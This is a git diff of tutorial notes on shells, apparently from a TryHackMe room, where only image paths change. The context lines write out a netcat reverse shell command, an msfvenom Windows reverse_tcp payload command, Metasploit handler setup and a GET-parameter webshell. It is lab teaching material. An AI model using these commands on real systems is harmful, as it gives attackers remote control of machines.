@@ -72,7 +72,7 @@ On the target:
 
 `nc <LOCAL-IP> <PORT> -e /bin/bash`
 
-![](./img/Pasted%20image%2020230904115554.png)
+![](img/Pasted%20image%2020230904115554.png)
 
 Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are _listening_ on our own attacking machine, and sending a connection _from_ the target.  
 
@@ -90,7 +90,7 @@ On the attacking machine:
 
 `nc MACHINE_IP <port>`
 
-![](./img/Pasted%20image%2020230904115614.png)
+![](img/Pasted%20image%2020230904115614.png)
 
 As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.
 
@@ -101,12 +101,12 @@ The important thing to understand here is that we are _listening_ on the target,
 The final concept which is relevant in this task is that of interactivity. Shells can be either _interactive_ or _non-interactive_.
 
 - _Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:
-![](./img/Pasted%20image%2020230904115651.png)
+![](img/Pasted%20image%2020230904115651.png)
 Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.
 
 - _Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:
 
-![](./img/Pasted%20image%2020230904115719.png)
+![](img/Pasted%20image%2020230904115719.png)
 
 - Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.
 
@@ -167,7 +167,7 @@ The first technique we'll be discussing is applicable only to Linux boxes, as th
 
 The full technique can be seen here:
 
-![](./img/Pasted%20image%2020230904121227.png)
+![](img/Pasted%20image%2020230904121227.png)
 
 Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.  
 
@@ -197,7 +197,7 @@ With any of the above techniques, it's useful to be able to change your terminal
 
 First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:
 
-![](./img/Pasted%20image%2020230904121310.png)
+![](img/Pasted%20image%2020230904121310.png)
 
 Next, in your reverse/bind shell, type in:
 
@@ -279,7 +279,7 @@ That's a lot to take in, so let's see it in action.
 
 As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
 
-![](./img/Pasted%20image%2020230904122146.png)
+![](img/Pasted%20image%2020230904122146.png)
 
 Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.
 
@@ -323,7 +323,7 @@ Again, note that even for a Windows target, the certificate must be used with th
 
 The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:
 
-![](./img/Pasted%20image%2020230904123006.png)
+![](img/Pasted%20image%2020230904123006.png)
 
 This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.
 
@@ -349,7 +349,7 @@ The following paragraph is the technical explanation for this command. It's slig
 
 > _The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._
 
-![](./img/Pasted%20image%2020230904123801.png)
+![](img/Pasted%20image%2020230904123801.png)
 
 A very similar command can be used to send a netcat reverse shell:
 
@@ -357,7 +357,7 @@ A very similar command can be used to send a netcat reverse shell:
 
 This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.
 
-![](./img/Pasted%20image%2020230904123819.png)
+![](img/Pasted%20image%2020230904123819.png)
 
 ---
 
@@ -369,7 +369,7 @@ This command is very convoluted, so for the sake of simplicity it will not be ex
 
 In order to use this, we need to replace `<IP>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
 
-![](./img/Pasted%20image%2020230904123900.png)
+![](img/Pasted%20image%2020230904123900.png)
 
 ---
 
@@ -389,7 +389,7 @@ For example, to generate a Windows x64 Reverse Shell in an exe format, we could 
 
 `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 
-![](./img/Pasted%20image%2020230904125112.png)
+![](img/Pasted%20image%2020230904125112.png)
 
 Here we are using a payload and four options:
 
@@ -463,7 +463,7 @@ Aside from the `msfconsole` man page, the other important thing to note when wor
 
 This can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads. For example:
 
-![](./img/Pasted%20image%2020230904125349.png)
+![](img/Pasted%20image%2020230904125349.png)
 
 This gives us a full set of Linux meterpreter payloads for 32bit targets.
 
@@ -478,7 +478,7 @@ Fortunately, it's relatively easy to use:
 
 We are now primed to start a multi/handler session. Let's take a look at the available options using the `options` command:
 
-![](./img/Pasted%20image%2020230904130624.png)
+![](img/Pasted%20image%2020230904130624.png)
 
 There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST _must_ be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your [tun0 address](http://10.10.10.10)). We set these options with the following commands:
 
@@ -490,13 +490,13 @@ We should now be ready to start the listener!
 
 Let's do this by using the `exploit -j` command. This tells Metasploit to launch the module, running as a **j**ob in the background.
 
-![](./img/Pasted%20image%2020230904130652.png)
+![](img/Pasted%20image%2020230904130652.png)
 
 You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit _must_ be run with sudo permissions.
 
 When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:
 
-![](./img/Pasted%20image%2020230904130712.png)
+![](img/Pasted%20image%2020230904130712.png)
 
 Notice that, because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use `sessions` to see all active sessions, then use `sessions <number>` to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "_Command Shell session **1** opened_").
 
@@ -516,7 +516,7 @@ This will take a GET parameter in the URL and execute it on the system with `she
 
 Let's see this in action:
 
-![](./img/Pasted%20image%2020230904131114.png)
+![](img/Pasted%20image%2020230904131114.png)
 
 Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the `ifconfig` command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. `whoami`, `hostname`, `arch`, etc).
 
